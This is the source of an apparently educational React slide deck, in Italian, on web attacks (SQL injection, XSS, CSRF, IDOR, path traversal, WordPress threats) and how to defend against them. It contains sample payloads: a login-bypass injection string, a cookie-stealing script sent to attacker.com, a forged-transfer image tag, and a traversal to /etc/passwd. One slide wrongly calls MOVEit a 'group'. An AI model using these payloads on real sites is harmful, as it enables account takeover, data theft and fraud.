import { motion } from 'framer-motion'
import { FiDatabase, FiCode, FiAlertTriangle, FiShield, FiGlobe } from 'react-icons/fi'

const fadeUp = {
  hidden: { opacity: 0, y: 30 },
  visible: (i = 0) => ({
    opacity: 1,
    y: 0,
    transition: { delay: i * 0.15, duration: 0.5, ease: 'easeOut' },
  }),
}

const slides = [
  // Slide 1 - Cover Attacchi Web
  () => (
    <div className="slide slide-cover">
      <motion.div className="cover-icon" initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: 'spring', duration: 0.8 }}>
        🌐
      </motion.div>
      <motion.h1 className="slide-title gradient-green" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
        Attacchi Web
      </motion.h1>
      <motion.p className="slide-text" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.6 }}>
        SQL Injection, Cross-Site Scripting e attacchi a WordPress: come i criminali sfruttano le vulnerabilità delle applicazioni web.
      </motion.p>
    </div>
  ),

  // Slide 2 - Cos'è SQL Injection
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">SQL Injection</motion.span>
        <motion.h2 className="slide-title" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          SQL Injection: L'Attacco ai Database
        </motion.h2>
        <motion.p className="slide-text" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          La <strong>SQL Injection</strong> è una tecnica che permette di inserire codice SQL malevolo nei campi di input di un'applicazione web, manipolando le query al database.
        </motion.p>
        <motion.div className="slide-columns" variants={fadeUp} initial="hidden" animate="visible" custom={3}>
          <div className="info-box danger">
            <div className="info-box-title"><FiDatabase /> Query normale</div>
            <div className="info-box-content">
              <code style={{ display: 'block', padding: '0.5rem', background: '#1a1a2e', borderRadius: '4px', fontSize: '0.85rem' }}>
                SELECT * FROM utenti<br/>
                WHERE username = '<span style={{ color: '#3b82f6' }}>mario</span>'<br/>
                AND password = '<span style={{ color: '#3b82f6' }}>secret123</span>'
              </code>
            </div>
          </div>
          <div className="info-box danger">
            <div className="info-box-title"><FiAlertTriangle /> Query con injection</div>
            <div className="info-box-content">
              <code style={{ display: 'block', padding: '0.5rem', background: '#1a1a2e', borderRadius: '4px', fontSize: '0.85rem' }}>
                SELECT * FROM utenti<br/>
                WHERE username = '<span style={{ color: '#ef4444' }}>' OR '1'='1</span>'<br/>
                AND password = '<span style={{ color: '#ef4444' }}>' OR '1'='1</span>'
              </code>
              <p style={{ marginTop: '0.5rem', fontSize: '0.85rem' }}>Risultato: <strong style={{ color: '#ef4444' }}>accesso senza password!</strong></p>
            </div>
          </div>
        </motion.div>
      </div>
    </div>
  ),

  // Slide 3 - SQL Injection esempi reali
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">SQL Injection</motion.span>
        <motion.h2 className="slide-title" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          SQL Injection: Impatto Reale
        </motion.h2>
        <motion.p className="slide-text" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          La SQL Injection è nella <a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a> da oltre 20 anni. Ecco cosa può fare un attaccante:
        </motion.p>
        <motion.div className="stat-grid" variants={fadeUp} initial="hidden" animate="visible" custom={3}>
          <div className="stat-card">
            <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>🔓</div>
            <div className="stat-number" style={{ fontSize: '1.2rem' }}>Bypass Login</div>
            <div className="stat-label">Accedere come admin senza conoscere la password</div>
          </div>
          <div className="stat-card">
            <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>📊</div>
            <div className="stat-number" style={{ fontSize: '1.2rem' }}>Furto Dati</div>
            <div className="stat-label">Estrarre interi database: email, password, carte di credito</div>
          </div>
          <div className="stat-card">
            <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>🗑️</div>
            <div className="stat-number" style={{ fontSize: '1.2rem' }}>DROP TABLE</div>
            <div className="stat-label">Cancellare tabelle o interi database</div>
          </div>
          <div className="stat-card">
            <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>💻</div>
            <div className="stat-number" style={{ fontSize: '1.2rem' }}>RCE</div>
            <div className="stat-label">In alcuni casi, eseguire comandi sul server</div>
          </div>
        </motion.div>
        <motion.div className="info-box warning" variants={fadeUp} initial="hidden" animate="visible" custom={4}>
          <div className="info-box-title">📰 Caso reale</div>
          <div className="info-box-content">
            Nel 2023, il gruppo <strong>MOVEit</strong> ha subito un attacco SQL injection che ha colpito <strong>2.500+ organizzazioni</strong> e esposto dati di <strong>65+ milioni di persone</strong> nel mondo.
          </div>
        </motion.div>
      </div>
    </div>
  ),

  // Slide 4 - Cross-Site Scripting (XSS)
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">XSS</motion.span>
        <motion.h2 className="slide-title" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          Cross-Site Scripting (XSS)
        </motion.h2>
        <motion.p className="slide-text" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          L'<strong>XSS</strong> permette di iniettare codice JavaScript malevolo nelle pagine web visualizzate da altri utenti. Il browser della vittima esegue lo script pensando che sia legittimo.
        </motion.p>
        <motion.div className="slide-columns" variants={fadeUp} initial="hidden" animate="visible" custom={3}>
          <div className="info-box danger">
            <div className="info-box-title"><FiCode /> Esempio di XSS</div>
            <div className="info-box-content">
              <p style={{ marginBottom: '0.5rem' }}>Un commento su un forum:</p>
              <code style={{ display: 'block', padding: '0.5rem', background: '#1a1a2e', borderRadius: '4px', fontSize: '0.8rem', wordBreak: 'break-all' }}>
                Ciao!&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
              </code>
              <p style={{ marginTop: '0.5rem', fontSize: '0.85rem', color: '#ef4444' }}>Il browser esegue lo script e invia i cookie all'attaccante!</p>
            </div>
          </div>
          <div className="info-box warning">
            <div className="info-box-title"><FiAlertTriangle /> Conseguenze</div>
            <div className="info-box-content">
              <ul style={{ paddingLeft: '1rem', lineHeight: '1.8' }}>
                <li><strong>Furto sessione:</strong> l'attaccante ruba i cookie e si finge te</li>
                <li><strong>Keylogging:</strong> registra tutto ciò che digiti</li>
                <li><strong>Defacement:</strong> modifica la pagina che vedi</li>
                <li><strong>Phishing:</strong> mostra form di login falsi</li>
              </ul>
            </div>
          </div>
        </motion.div>
      </div>
    </div>
  ),

  // Slide 5 - CSRF (Cross-Site Request Forgery)
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">CSRF</motion.span>
        <motion.h2 className="slide-title" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          CSRF: L'Attacco Invisibile
        </motion.h2>
        <motion.p className="slide-text" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          Il <strong>Cross-Site Request Forgery</strong> (CSRF) induce l'utente a eseguire azioni indesiderate su un sito dove è già autenticato, senza che se ne accorga.
        </motion.p>
        <motion.div className="info-box danger" variants={fadeUp} initial="hidden" animate="visible" custom={3}>
          <div className="info-box-title"><FiAlertTriangle /> Come funziona</div>
          <div className="info-box-content">
            <ol style={{ paddingLeft: '1rem', lineHeight: '2' }}>
              <li>Sei loggato nella tua banca online (sessione attiva)</li>
              <li>Visiti un sito malevolo o apri un'email con un link/immagine nascosta</li>
              <li>Il sito contiene: <code style={{ background: '#1a1a2e', padding: '2px 6px', borderRadius: '3px' }}>&lt;img src="https://banca.it/trasferisci?a=attacker&amount=1000"&gt;</code></li>
              <li>Il tuo browser invia la richiesta alla banca <strong>con i tuoi cookie di sessione</strong></li>
              <li>La banca esegue il bonifico pensando sia una tua richiesta legittima!</li>
            </ol>
          </div>
        </motion.div>
        <motion.div className="slide-columns" variants={fadeUp} initial="hidden" animate="visible" custom={4}>
          <div className="info-box warning">
            <div className="info-box-title">🎯 Azioni possibili</div>
            <div className="info-box-content">Cambiare email/password, trasferire denaro, pubblicare post, eliminare account</div>
          </div>
          <div className="info-box success">
            <div className="info-box-title"><FiShield /> Difesa</div>
            <div className="info-box-content">Token CSRF, header SameSite sui cookie, richiesta conferma per azioni critiche</div>
          </div>
        </motion.div>
      </div>
    </div>
  ),

  // Slide 6 - Altri attacchi comuni
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">Altri Attacchi</motion.span>
        <motion.h2 className="slide-title" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          Altri Attacchi Web Comuni
        </motion.h2>
        <motion.div className="slide-columns" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          <div className="info-box danger">
            <div className="info-box-title">🔑 Brute Force</div>
            <div className="info-box-content">
              Bot che provano migliaia di combinazioni username/password al secondo. Target: pagine di login di WordPress, admin panel, SSH.
              <p style={{ marginTop: '0.5rem', color: '#22c55e' }}><strong>Difesa:</strong> 2FA, rate limiting, CAPTCHA, fail2ban</p>
            </div>
          </div>
          <div className="info-box danger">
            <div className="info-box-title">📁 File Upload</div>
            <div className="info-box-content">
              Caricare file malevoli (.php, .jsp) spacciandoli per immagini. Una volta sul server, l'attaccante può eseguire codice.
              <p style={{ marginTop: '0.5rem', color: '#22c55e' }}><strong>Difesa:</strong> validare tipo MIME, rinominare file, cartelle non eseguibili</p>
            </div>
          </div>
          <div className="info-box danger">
            <div className="info-box-title">🔢 IDOR</div>
            <div className="info-box-content">
              Modificare ID nelle URL per accedere a dati altrui: <code>/fattura?id=123</code> → <code>/fattura?id=124</code>
              <p style={{ marginTop: '0.5rem', color: '#22c55e' }}><strong>Difesa:</strong> controlli di autorizzazione lato server, UUID invece di ID sequenziali</p>
            </div>
          </div>
          <div className="info-box danger">
            <div className="info-box-title">📂 Path Traversal</div>
            <div className="info-box-content">
              Accedere a file fuori dalla cartella web: <code>/download?file=../../../etc/passwd</code>
              <p style={{ marginTop: '0.5rem', color: '#22c55e' }}><strong>Difesa:</strong> validare e sanitizzare i path, whitelist di file permessi</p>
            </div>
          </div>
        </motion.div>
      </div>
    </div>
  ),

  // Slide 7 - Attacchi WordPress
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">WordPress</motion.span>
        <motion.h2 className="slide-title" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          Attacchi a WordPress: Il Bersaglio Preferito
        </motion.h2>
        <motion.p className="slide-text" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          <strong>WordPress</strong> alimenta il <strong>43% di tutti i siti web</strong> del mondo. Questa popolarità lo rende il bersaglio preferito dei bot automatizzati.
        </motion.p>
        <motion.div className="slide-columns" variants={fadeUp} initial="hidden" animate="visible" custom={3}>
          <div className="info-box danger">
            <div className="info-box-title">🤖 Bot SEO Spam</div>
            <div className="info-box-content">
              Bot automatici sfruttano vulnerabilità nei plugin per:
              <ul style={{ paddingLeft: '1rem', marginTop: '0.5rem', lineHeight: '1.6' }}>
                <li>Iniettare <strong>link spam nascosti</strong> (farmacie, casinò, porno)</li>
                <li>Creare <strong>redirect</strong> a siti malevoli</li>
                <li>Inserire <strong>pagine fantasma</strong> indicizzate da Google</li>
                <li>Il proprietario spesso non se ne accorge per mesi!</li>
              </ul>
            </div>
          </div>
          <div className="info-box danger">
            <div className="info-box-title">🔌 Plugin Vulnerabili</div>
            <div className="info-box-content">
              <ul style={{ paddingLeft: '1rem', lineHeight: '1.6' }}>
                <li>Migliaia di plugin con vulnerabilità note</li>
                <li>Plugin abbandonati mai aggiornati</li>
                <li>Temi pirata con backdoor incluse</li>
                <li><a href="https://wpscan.com/statistics/" target="_blank" rel="noopener noreferrer">WPScan</a>: 50.000+ vulnerabilità catalogate</li>
              </ul>
            </div>
          </div>
        </motion.div>
        <motion.div className="info-box warning" variants={fadeUp} initial="hidden" animate="visible" custom={4}>
          <div className="info-box-title">📊 Statistiche</div>
          <div className="info-box-content">
            Secondo <a href="https://www.wordfence.com/" target="_blank" rel="noopener noreferrer">Wordfence</a>, nel 2024 sono stati bloccati <strong>100+ miliardi di attacchi</strong> a siti WordPress. Il 90% sfrutta plugin non aggiornati.
          </div>
        </motion.div>
      </div>
    </div>
  ),

  // Slide 8 - Come proteggersi
  () => (
    <div className="slide">
      <div className="slide-inner">
        <motion.span className="slide-badge attacchi-web" variants={fadeUp} initial="hidden" animate="visible">Protezione</motion.span>
        <motion.h2 className="slide-title gradient-green" variants={fadeUp} initial="hidden" animate="visible" custom={1}>
          Come Proteggersi dagli Attacchi Web
        </motion.h2>
        <motion.div className="slide-columns" variants={fadeUp} initial="hidden" animate="visible" custom={2}>
          <div className="info-box success">
            <div className="info-box-title"><FiShield /> Contro SQL Injection</div>
            <div className="info-box-content">
              <ul style={{ paddingLeft: '1rem', lineHeight: '1.8' }}>
                <li><strong>Prepared Statements:</strong> mai concatenare input utente nelle query</li>
                <li><strong>ORM:</strong> usare framework che gestiscono le query</li>
                <li><strong>Validazione input:</strong> controllare tipo e formato dei dati</li>
                <li><strong>Principio del minimo privilegio:</strong> l'app non deve essere admin del DB</li>
              </ul>
            </div>
          </div>
          <div className="info-box success">
            <div className="info-box-title"><FiGlobe /> Contro XSS</div>
            <div className="info-box-content">
              <ul style={{ paddingLeft: '1rem', lineHeight: '1.8' }}>
                <li><strong>Escape output:</strong> codificare caratteri speciali (&lt; &gt; &amp;)</li>
                <li><strong>Content Security Policy:</strong> header HTTP che limita gli script</li>
                <li><strong>HttpOnly cookies:</strong> impedisce a JavaScript di leggere i cookie</li>
              </ul>
            </div>
          </div>
        </motion.div>
        <motion.div className="info-box info" variants={fadeUp} initial="hidden" animate="visible" custom={3}>
          <div className="info-box-title">🔧 Per WordPress</div>
          <div className="info-box-content">
            <strong>Aggiornare sempre</strong> WordPress, temi e plugin | Usare plugin di sicurezza (<a href="https://www.wordfence.com/" target="_blank" rel="noopener noreferrer">Wordfence</a>, <a href="https://sucuri.net/" target="_blank" rel="noopener noreferrer">Sucuri</a>) | Rimuovere plugin inutilizzati | <strong>Mai usare temi/plugin pirata</strong> | Backup regolari | Limitare tentativi di login
          </div>
        </motion.div>
      </div>
    </div>
  ),
]

export default slides
